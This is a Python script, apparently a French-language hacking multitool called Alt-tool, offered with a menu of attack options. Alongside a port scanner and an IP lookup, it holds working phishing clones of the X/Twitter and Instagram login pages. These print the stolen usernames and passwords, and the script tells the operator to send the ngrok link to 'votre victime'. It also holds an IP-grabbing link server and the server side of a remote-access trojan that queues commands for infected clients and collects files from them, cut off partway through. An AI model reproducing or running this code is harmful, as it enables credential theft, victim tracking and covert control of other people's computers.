import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import requests
import time
import sys
import discord
import asyncio
from flask import Flask, render_template_string, request, redirect, url_for, jsonify
from colorama import Fore, Style, init
from urllib.parse import urlparse
import ssl
from urllib.parse import quote
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import threading
import base64
import os
import socket
from flask import Flask, send_file
import PyInstaller.__main__
from pyngrok import ngrok, conf
from flask import Flask, request, jsonify, send_file
import subprocess



def print_violet_white_gradient(text, total_time=0.010):
    gradient = [(128, 0, 128), (255, 255, 255)]  
    gradient_step = 1.0 / (len(text) - 1)
    
    interval = total_time / len(text)

    for i in range(len(text)):
        ratio = i * gradient_step
        r = int(gradient[0][0] * (1 - ratio) + gradient[1][0] * ratio)
        g = int(gradient[0][1] * (1 - ratio) + gradient[1][1] * ratio)
        b = int(gradient[0][2] * (1 - ratio) + gradient[1][2] * ratio)

        sys.stdout.write(f"\033[38;2;{r};{g};{b}m{text[i]}")
        sys.stdout.flush()
        time.sleep(interval) 

    sys.stdout.write("\033[0m\n")

os.system('cls' if os.name == 'nt' else 'clear')
HackAltool = """
                       _____   .__    __                  .__         ___________                        
                      /  _  \  |  | _/  |_  ____    ____  |  |        \_   _____/_______   ____   ____   
                     /  /_\  \ |  | \   __\/  _ \  /  _ \ |  |   ______|    __)  \_  __ \_/ __ \_/ __ \  
                    /    |    \|  |__|  | (  <_> )(  <_> )|  |__/_____/|     \    |  | \/\  ___/\  ___/  
                    \____|__  /|____/|__|  \____/  \____/ |____/       \___  /    |__|    \___  >\___  > 
                            \/                                             \/                 \/     \/  
                                                                                    
                 """

print_violet_white_gradient(HackAltool)

intro = """
    < [V] 2.2.1                                                     By AltWolf
    < [Creator] Team AltSad                                         Free Version !
"""
print_violet_white_gradient(intro)
print(f""" {Fore.MAGENTA}        
                    
 ╔═══           Scan-Grab          ═══╗ ╔═══             track             ═══╗ ╔═══           Pentest             ═══╗ 
 {Fore.WHITE}║{Fore.LIGHTMAGENTA_EX}   ({Fore.WHITE}01{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Ip scanner                ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}07{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > username tracker           ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}13{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > XSS search                 ║
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}02{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > ip info                         {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}08{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > phone tracker                    {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}14{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > SQL search
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}03{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Link Grabber ip                 {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}09{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > email tracker                    {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}15{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Vulnerability Search
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}04{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Phishing Twitter                {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}10{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > ID tracker                       {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}16{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Scanner Web
     {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}05{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Phishing Instagram              {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}11{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > controleur bot                   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}17{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Contact                    
 ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}06{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Mini Rat !                ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}12{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Metadata for image         ║ ║   {Fore.LIGHTMAGENTA_EX}({Fore.WHITE}18{Fore.LIGHTMAGENTA_EX}){Fore.WHITE} > Update ?                   ║
 {Fore.MAGENTA}╚═══                              ═══╝ ╚═══                               ═══╝ ╚═══                               ═══╝
""")
green = "\033[92m"
red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"

       
def Title(text):
    print(f"{white}{text}{reset}")

       
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.02)  
    print()

     
def gradient():
    for i in range(256):
        color = f"\033[38;5;{i}m" 
        time.sleep(0.05)  
    print()  

    


menu_choice = input(f"""{Fore.MAGENTA}
┌───({Fore.WHITE}AltWolf@altool{Fore.MAGENTA})─[{Fore.WHITE}~/1{Fore.MAGENTA}]                    
└──$  {Fore.WHITE}""")


green = "\033[92m"
red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"

      
def Title(text):
    print(f"{white}{text}{reset}")

        
def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.02)  
    print()

        
def gradient():
    for i in range(256):
        color = f"\033[38;5;{i}m" 
        time.sleep(0.05) 
    print()  

if menu_choice == "":
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("python Alt-tool-Free.py")

if menu_choice == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            sde = """
        .....:-=====-:.....                   
       ...-+++=--::-====-...                  
     ...=*+:............-+-:..                
    ..-*+:................-=-...              
    .-#=...................:+-..              
    :*+.....................-=-.              
    =*:........... .........:==..          Ip scanner By AltWolf   
    +*:......................==:.               Version free
    =*:.....................:==:..            
    -#-:...................:-+-.              
    .+#:::................::+=:.              
    ..+#-:::............::-++:..              
     .-%+:::::::::.:::::=*++=..              
     ..-#*=::...::::=+**+*+:+++:..          
      ...-+#%%%###*+:...*+##+=++...        
             ......      .*+#%*+=++..       
                         ..+*+%%*==**...    
                          ..+**%%*=+*+..   
                            ..:#**%#+=+*=...
                               .-#*#%#+=+#=.
                                ..+#+#%#+-..
                                 .:*#++..  
                                    .....  
            """
            print_violet_white_gradient(sde)
            def scan_ports(ip, start_port, end_port):
                open_ports = []
                for port in range(start_port, end_port + 1):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        result = s.connect_ex((ip, port))
                        if result == 0:
                            open_ports.append(port)
                        s.close()
                    except:
                        pass
                return open_ports

            ip = input("Enter IP address to scan: ")
            start_port = int(input("Enter starting port: "))
            end_port = int(input("Enter ending port: "))

            print(f"Scanning open ports on {ip}...")
            open_ports = scan_ports(ip, start_port, end_port)

            if open_ports:
                print("Open ports found:")
                for port in open_ports:
                    print(f"Port {port} is open")
            else:
                print("No open ports found.")

            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")

elif menu_choice == "2":
        os.system('cls' if os.name == 'nt' else 'clear')
        rtr = """

    .....:-=====-:.....                   
   ...-+++=--::-====-...                  
 ...=*+:............-+-:..                
..-*+:................-=-...              
.-#=...................:+-..              
:*+.....................-=-.              
=*:........... .........:==..             
+*:......................==:.             
=*:.....................:==:..            Ip info By AltWolf - AltSad
-#-:...................:-+-.                      Version free
.+#:::................::+=:.              
..+#-:::............::-++:..              
  .-%+:::::::::.:::::=*++=..              
   ..-#*=::...::::=+**+*+:+++:..          
     ...-+#%%%###*+:...*+##+=++...        
           ......      .*+#%*+=++..       
                       ..+*+%%*==**...    
                         ..+**%%*=+*+..   
                          ..:#**%#+=+*=...
                             .-#*#%#+=+#=.
                              ..+#+#%#+-..
                                .:*#++..  
                                  .....  
        """
        print_violet_white_gradient(rtr)
        def get_ip_info(ip):
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url)
            return response.json()

        def print_ip_info(data):
            print("IP Address Information:")
            print(f"    Country: {data['country']}")
            print(f"    Country Code: {data['countryCode']}")
            print(f"    Region: {data['regionName']}")
            print(f"    City: {data['city']}")
            print(f"    ZIP Code: {data['zip']}")
            print(f"    Latitude: {data['lat']}")
            print(f"    Longitude: {data['lon']}")
            print(f"    Timezone: {data['timezone']}")
            print(f"    ISP: {data['isp']}")
            print(f"    AS: {data['as']}")
            print(f"    IP Address: {data['query']}")

        ip_address = input("Enter IP address to lookup: ")
        ip_info = get_ip_info(ip_address)
        print_ip_info(ip_info)

        input("Press enter to continue...")
        time.sleep(1)
        os.system("python Alt-tool-Free.py")

if menu_choice == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        rez = """
     .....:-=====-:.....                   
    ...-+++=--::-====-...                  
 ...=*+:............-+-:..                
 ..-*+:................-=-...              
 .-#=...................:+-..              
 :*+.....................-=-.              
 =*:........... .........:==..             
 +*:......................==:.             
 =*:.....................:==:..            
 -#-:...................:-+-.              Link Grabber By AltWolf - AltSad
 .+#:::................::+=:.                       Version free
 ..+#-:::............::-++:..                      You need Ngrock
   .-%+:::::::::.:::::=*++=..              
    ..-#*=::...::::=+**+*+:+++:..          
      ...-+#%%%###*+:...*+##+=++...        
            ......      .*+#%*+=++..       
                        ..+*+%%*==**...    
                          ..+**%%*=+*+..   
                           ..:#**%#+=+*=...
                              .-#*#%#+=+#=.
                               ..+#+#%#+-..
                                 .:*#++..  
                                   .....  
        """
        print_violet_white_gradient(rez)
        app = Flask(__name__)

        def get_ip_info(ip):
            try:
                response = requests.get(f'http://ip-api.com/json/{ip}')
                return response.json()
            except:
                return None

        @app.route('/')
        def index():
            html_content = '''
            <!doctype html>
            <html>
            <head>
                <title>IP Info</title>
                <script>
                    async function getPublicIP() {
                        try {
                            let response = await fetch('https://api.ipify.org?format=json');
                            let data = await response.json();
                            fetch('/report_ip', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({ ip: data.ip })
                            });
                        } catch (error) {
                            console.error('Error fetching IP:', error);
                        }
                    }
                    window.onload = getPublicIP;
                </script>
            </head>
            <body>
                <h1>Collecting IP Information...</h1>
            </body>
            </html>
            '''
            return render_template_string(html_content)

        @app.route('/report_ip', methods=['POST'])
        def report_ip():
            data = request.get_json()
            user_ip = data['ip']
            ip_info = get_ip_info(user_ip)

            print(f"User public IP address: {user_ip}")
            if ip_info:
                print("IP Address Information:")
                for key, value in ip_info.items():
                    print(f"{key}: {value}")
            else:
                print("Unable to retrieve IP information.")

            return jsonify({'status': 'success'})

        if __name__ == '__main__':
            ngrok_auth_token = input("Enter your ngrok authentication token: ")
            ngrok.set_auth_token(ngrok_auth_token)

            port = input("Enter the port to run Flask server: ")

            ngrok_tunnel = ngrok.connect(port)
            public_url = ngrok_tunnel.public_url
            print(f"Public tunnel available at: {public_url}")
            print("Send this URL to your target:")
            print(public_url)

            try:
                app.run(port=int(port))
            except KeyboardInterrupt:
                print("\nServer stopped.")
            
            input("Press enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")

if menu_choice == "4":
        os.system('cls' if os.name == 'nt' else 'clear')  
        gdgd = """
    .                     ..:=====-:..   ....  
   .-:.                  :============::-==:.  
   :==-..              .=================-..:. 
   -=====:.           .-===================-.  
   :========:..       .==================-..   
   .-===========-:.....=================-.     
    .:==================================-.     
   -=--=================================-.     
   :====================================:      
   .:==================================-.        Twitter Phishing by AltWolf
     .-================================.               Version V1.0.1
     ....:============================:.       
      .==============================:.        
       .:===========================.          
         ..-======================:.           
           ..-==================-..            
.........:====================-.               
 ..-=======================:..                 
     ..:--===========--:..                     
          ..........                 
        """
        print_violet_white_gradient(gdgd)
        app = Flask(__name__)

        html_contenta = '''
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Connectez-vous à X</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                    background: #2c3e50;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                }

                .modal {
                    background: #000;
                    border-radius: 16px;
                    width: 600px;
                    max-width: 90vw;
                    padding: 0;
                    position: relative;
                    max-height: 90vh;
                    overflow-y: auto;
                }

                .close-btn {
                    position: absolute;
                    top: 12px;
                    left: 12px;
                    background: none;
                    border: none;
                    color: #fff;
                    font-size: 20px;
                    cursor: pointer;
                    width: 36px;
                    height: 36px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    border-radius: 50%;
                    z-index: 10;
                }

                .close-btn:hover {
                    background: rgba(255, 255, 255, 0.1);
                }

                .logo {
                    display: flex;
                    justify-content: center;
                    padding: 20px;
                }

                .logo svg {
                    width: 40px;
                    height: 40px;
                    fill: #fff;
                }

                .content {
                    padding: 20px 80px 48px;
                }

                h1 {
                    color: #fff;
                    font-size: 31px;
                    font-weight: 700;
                    text-align: center;
                    margin-bottom: 36px;
                }

                .social-buttons {
                    display: flex;
                    flex-direction: column;
                    gap: 12px;
                    margin-bottom: 20px;
                }

                .social-btn {
                    width: 100%;
                    background: #fff;
                    border: 1px solid rgb(207, 217, 222);
                    border-radius: 9999px;
                    padding: 8px 24px;
                    color: #0f1419;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                    min-height: 40px;
                    transition: background 0.2s;
                }

                .social-btn:hover {
                    background: rgb(242, 242, 242);
                }

                .social-btn svg {
                    width: 20px;
                    height: 20px;
                }

                .divider {
                    display: flex;
                    align-items: center;
                    margin: 20px 0;
                    color: #fff;
                    font-size: 15px;
                }

                .divider::before,
                .divider::after {
                    content: '';
                    flex: 1;
                    height: 1px;
                    background: rgb(47, 51, 54);
                }

                .divider span {
                    padding: 0 16px;
                }

                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 20px;
                }

                .input-group {
                    position: relative;
                }

                input {
                    width: 100%;
                    background: #000;
                    border: 1px solid rgb(51, 54, 57);
                    border-radius: 4px;
                    padding: 18px 12px 8px;
                    color: #fff;
                    font-size: 17px;
                    transition: border-color 0.2s;
                }

                input::placeholder {
                    color: rgb(113, 118, 123);
                }

                input:focus {
                    outline: none;
                    border-color: rgb(29, 155, 240);
                }

                .login-btn {
                    width: 100%;
                    background: #fff;
                    border: none;
                    border-radius: 9999px;
                    padding: 12px 24px;
                    color: #0f1419;
                    font-size: 17px;
                    font-weight: 700;
                    cursor: pointer;
                    min-height: 52px;
                    transition: background 0.2s;
                }

                .login-btn:hover {
                    background: rgb(215, 219, 220);
                }

                .forgot-password {
                    background: none;
                    border: 1px solid rgb(51, 54, 57);
                    border-radius: 9999px;
                    padding: 12px 24px;
                    color: #fff;
                    font-size: 17px;
                    font-weight: 700;
                    cursor: pointer;
                    min-height: 52px;
                    transition: background 0.2s;
                }

                .forgot-password:hover {
                    background: rgba(255, 255, 255, 0.03);
                }

                .signup-section {
                    color: rgb(113, 118, 123);
                    font-size: 15px;
                    margin-top: 40px;
                }

                .signup-section a {
                    color: rgb(29, 155, 240);
                    text-decoration: none;
                }

                .signup-section a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <div class="modal">
                <button class="close-btn">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                        <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"/>
                    </svg>
                </button>

                <div class="logo">
                    <svg viewBox="0 0 24 24">
                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                    </svg>
                </div>

                <div class="content">
                    <h1>Connectez-vous à X</h1>

                    <div class="social-buttons">
                        <button class="social-btn">
                            <svg viewBox="0 0 24 24">
                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                            </svg>
                            Se connecter avec Google
                        </button>

                        <button class="social-btn">
                            <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                            </svg>
                            Se connecter avec Apple
                        </button>
                    </div>

                    <div class="divider">
                        <span>ou</span>
                    </div>

                    <form method="post" class="login-form">
                        <div class="input-group">
                            <input type="text" name="username" placeholder="Username or email" id="username">
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" placeholder="Password" id="password">
                        </div>
                        <button type="submit" class="login-btn">Se connecter</button>
                    </form>

                    <button type="button" class="forgot-password" style="margin-top: 20px;">Mot de passe oublié ?</button>

                    <div class="signup-section">
                        Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
            '''

        def get_client_ip():
            if 'X-Forwarded-For' in request.headers:
                return request.headers['X-Forwarded-For'].split(',')[0]
            return request.remote_addr

        @app.route('/capture_ip', methods=['GET'])
        def capture_ip():
            client_ip = request.args.get('ip')
            print(f"Client Public IP: {client_ip}")
            return {'ip': client_ip}, 200

        @app.route('/', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                print(f"Username/Email: {username}")
                print(f"Password: {password}")
                return "ERROR 404"
            return render_template_string(html_contenta)

        if __name__ == '__main__':    
            ngrok_auth_token = input("Entrez votre jeton d'authentification ngrok : ")
            ngrok.set_auth_token(ngrok_auth_token)
            port = 5000
            ngrok_tunnel = ngrok.connect(port)
            public_url = ngrok_tunnel.public_url
            print(f"Tunnel public disponible à l'adresse : {public_url}")
            print("Envoyez l'URL suivante à votre victime :")
            print(public_url)
            app.run(host='0.0.0.0', port=port, debug=False)        

if menu_choice == "5":
    os.system('cls' if os.name == 'nt' else 'clear')
    contact = """
    ╔══╗         ╔╗                          ╔═══╗╔╗        ╔╗            
    ╚╣╠╝        ╔╝╚╗                         ║╔═╗║║║        ║║            
     ║║ ╔═╗ ╔══╗╚╗╔╝╔══╗ ╔══╗╔═╗╔══╗ ╔╗╔╗    ║╚═╝║║╚═╗╔╗╔══╗║╚═╗╔╗╔═╗ ╔══╗
     ║║ ║╔╗╗║══╣ ║║ ╚ ╗║ ║╔╗║║╔╝╚ ╗║ ║╚╝║    ║╔══╝║╔╗║╠╣║══╣║╔╗║╠╣║╔╗╗║╔╗║
    ╔╣╠╗║║║║╠══║ ║╚╗║╚╝╚╗║╚╝║║║ ║╚╝╚╗║║║║    ║║   ║║║║║║╠══║║║║║║║║║║║║╚╝║
    ╚══╝╚╝╚╝╚══╝ ╚═╝╚═══╝╚═╗║╚╝ ╚═══╝╚╩╩╝    ╚╝   ╚╝╚╝╚╝╚══╝╚╝╚╝╚╝╚╝╚╝╚═╗║
                         ╔═╝║              Need ngrok                 ╔═╝║
                         ╚══╝                                         ╚══╝
    """
    print_violet_white_gradient(contact)  
    app = Flask(__name__)

    html_contenta = '''
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #000;
                color: #fff;
                display: flex;
                flex-direction: column;
                min-height: 100vh;
            }

            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                flex: 1;
                padding: 20px;
                gap: 80px;
            }

            .images-section {
                position: relative;
                width: 450px;
                height: 500px;
            }

            .images-section img {
                width: 100%;
                height: 100%;
                object-fit: contain;
            }

            .login-section {
                width: 350px;
            }

            .logo {
                font-family: 'Brush Script MT', cursive;
                font-size: 52px;
                text-align: center;
                margin-bottom: 40px;
                font-weight: 400;
                letter-spacing: 1px;
            }

            .login-form {
                display: flex;
                flex-direction: column;
                gap: 8px;
                padding-left: 95px;
                padding-right: 10px;
            }

            input {
                background-color: transparent;
                border: 1px solid #363636;
                border-radius: 3px;
                padding: 12px 10px;
                color: #fff;
                font-size: 13px;
                outline: none;
            }

            input::placeholder {
                color: #737373;
            }

            input:focus {
                border-color: #555;
            }

            .login-btn {
                background-color: #0095f6;
                color: #fff;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                margin-top: 12px;
                margin-left: -32px;
                margin-right: 30px;
            }

            .login-btn:hover {
                background-color: #1877f2;
            }

            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: #737373;
                font-size: 13px;
                font-weight: 600;
            }

            .divider::before,
            .divider::after {
                content: '';
                flex: 1;
                height: 1px;
                background-color: #363636;
            }

            .divider::before {
                margin-right: 18px;
            }

            .divider::after {
                margin-left: 18px;
            }

            .facebook-login {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                color: #0095f6;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                margin-bottom: 20px;
            }

            .facebook-icon {
                width: 20px;
                height: 20px;
                background-color: #0095f6;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #fff;
                font-weight: bold;
            }

            .forgot-password {
                text-align: center;
                color: #a8a8a8;
                font-size: 12px;
                margin-bottom: 20px;
            }

            .report-text {
                text-align: center;
                color: #a8a8a8;
                font-size: 12px;
                line-height: 1.5;
                margin-bottom: 20px;
            }

            .report-text a {
                color: #0095f6;
                text-decoration: none;
            }

            .signup-text {
                text-align: center;
                color: #fff;
                font-size: 14px;
            }

            .signup-text a {
                color: #0095f6;
                text-decoration: none;
                font-weight: 600;
            }

            footer {
                padding: 30px 20px;
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }

            .footer-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 15px;
                font-size: 12px;
            }

            .footer-links a {
                color: #737373;
                text-decoration: none;
            }

            .footer-links a:hover {
                text-decoration: underline;
            }

            .footer-bottom {
                display: flex;
                gap: 20px;
                align-items: center;
                font-size: 12px;
                color: #737373;
            }

            .language-selector {
                background: transparent;
                border: none;
                color: #737373;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="images-section">
                <img src="https://i.postimg.cc/8chnPvx8/insta.png" alt="Instagram Photos">
            </div>

            <div class="login-section">
                <div class="logo">Instagram</div>
                
                <form method="post" class="login-form">
                    <div class="input-group">
                        <input type="text" name="username" placeholder="Username or email" id="username">
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" id="password">
                    </div>
                    <button type="submit" class="login-btn">Se connecter</button>
                </form>

                <div class="divider">OU</div>

                <div class="facebook-login">
                    <div class="facebook-icon">f</div>
                    <span>Se connecter avec Facebook</span>
                </div>

                <div class="forgot-password">Mot de passe oublié ?</div>

                <div class="report-text">
                    Vous pouvez également <a href="#">signaler le contenu que vous pensez illégal</a> dans votre pays sans vous connecter.
                </div>

                <div class="signup-text">
                    Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
                </div>
            </div>
        </div>

        <footer>
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">À propos</a>
                <a href="#">Blog</a>
                <a href="#">Emplois</a>
                <a href="#">Aide</a>
                <a href="#">API</a>
                <a href="#">Confidentialité</a>
                <a href="#">Paramètres des cookies</a>
                <a href="#">Conditions</a>
                <a href="#">Lieux</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a>
                <a href="#">Articles de Meta AI</a>
                <a href="#">Threads</a>
                <a href="#">Importation des contacts et non-utilisateurs</a>
                <a href="#">Meta Verified</a>
                <a href="#">Résilier des contrats ici</a>
            </div>
            <div class="footer-bottom">
                <select class="language-selector">
                    <option>Français</option>
                    <option>English</option>
                </select>
                <span>© 2025 Instagram par Meta</span>
            </div>
        </footer>
    </body>
    </html>
    '''
    def get_client_ip():
        if 'X-Forwarded-For' in request.headers:
            return request.headers['X-Forwarded-For'].split(',')[0]
        return request.remote_addr

    @app.route('/capture_ip', methods=['GET'])
    def capture_ip():
        client_ip = request.args.get('ip')
        print(f"Client Public IP: {client_ip}")
        return {'ip': client_ip}, 200

    @app.route('/', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            print(f"Username/Email: {username}")
            print(f"Password: {password}")
            return "ERROR 404"
        return render_template_string(html_contenta)

    if __name__ == '__main__':
        
        ngrok_auth_token = input("Entrez votre jeton d'authentification ngrok : ")
        ngrok.set_auth_token(ngrok_auth_token)
        port = 5000      
        ngrok_tunnel = ngrok.connect(port)
        public_url = ngrok_tunnel.public_url
        print(f"Tunnel public disponible à l'adresse : {public_url}")         
        print("Envoyez l'URL suivante à votre victime :")
        print(public_url)     
        app.run(host='0.0.0.0', port=port, debug=False)


if menu_choice == "6":
    os.system('cls' if os.name == 'nt' else 'clear')
    mini = """
                             ..--=======-.
                          .-**=:.......++.
                         :*=.        .*+. 
                        -*:        --.+-. 
                       .*=.        :*:+=. 
                       -*.       .   .+=. 
                       -*.      :*=. .++. 
                       -*.      .*+*+=++. 
         ..::::::::::::=*.      .*-       
    ..-+**+-::::::::::::.       .*-       
   :++::++.                     .+=       Mini Rat By AltWolf
 .:*-.=**-                      .+=          Version V1.1.1
 .+-.=*:*:                      .+=.      
 -*.:*::*.                       ++.      
 =***- -*.   .=************+.    =+.      
       =+.  .=+.           =+.   -*.      
      .++-:.=+.            .++..-=*:      
    .+*-::-**:              .+*+:::+*:    
   .=+.    .+=              :*:.   .-*:   
   .++.    .+=              :*:     :*:   
    .++:..:++.              .=*-...-*-.   
     .:=++=:.                ..-=+=-..
    """
    print_violet_white_gradient(mini)
    app = Flask(__name__)
    received_files = {}
    command_queue = {}  
    results_queue = {}  

    @app.route('/view/<filename>')
    def view_file(filename):
        if filename in received_files:
            return send_file(received_files[filename], mimetype='image/jpeg')
        return "File not found", 404

    @app.route('/register', methods=['POST'])
    def register_client():
        data = request.json
        client_id = data.get('client_id')
        client_info = data.get('info', 'Unknown')
        
        if client_id not in command_queue:
            command_queue[client_id] = {"command": None, "executed": False}
            results_queue[client_id] = {"result": None, "retrieved": True}
            print(f"\n{'='*60}")
            print(f" NOUVEAU CLIENT CONNECTÉ: {client_id}")
            print(f" Info: {client_info}")
            print(f"{'='*60}\n")
        
        return jsonify({"status": "registered"})

    @app.route('/get_command', methods=['POST'])
    def get_command():
        data = request.json
        client_id = data.get('client_id')
        
        if client_id in command_queue:
            cmd_data = command_queue[client_id]
            if cmd_data["command"] and not cmd_data["executed"]:
                cmd_data["executed"] = True
                return jsonify({"command": cmd_data["command"]})
        
        return jsonify({"command": None})

    @app.route('/send_result', methods=['POST'])
    def send_result():
        data = request.json
        client_id = data.get('client_id')
        result = data.get('result', '')
        result_type = data.get('type', 'text')
        
        if client_id in results_queue:
            if result_type == 'file':
                file_data = base64.b64decode(result)
                filename = f"{client_id}_{int(time.time())}.jpg"
                filepath = os.path.join(os.getcwd(), filename)
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                received_files[filename] = filepath
                results_queue[client_id] = {
                    "result": f"Fichier reçu: {filename}",
                    "retrieved": False,
                    "file": filename
                }
            else:
                results_queue[client_id] = {
                    "result": result,
                    "retrieved": False
                }
        
        return jsonify({"status": "received"})

    def start_flask(port):
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)

    def command_interface(flask_url):
        active_clients = []
        current_client = None
        
        print("\n" + "="*60)
        print("INTERFACE DE COMMANDE")
        print("="*60)
        print("Tapez 'clients' pour voir les clients connectés")
        print("Tapez 'select <id>' pour sélectionner un client")
        print("Tapez 'help' pour voir les commandes disponibles")
        print("="*60 + "\n")
        
        while True:
            try:
                
                active_clients = [cid for cid in command_queue.keys()]
                
                if current_client:
                    prompt = f"[{current_client}] $ "
                else:
                    prompt = "RAT $ "
                
                user_input = input(prompt).strip()
                
                if not user_input:
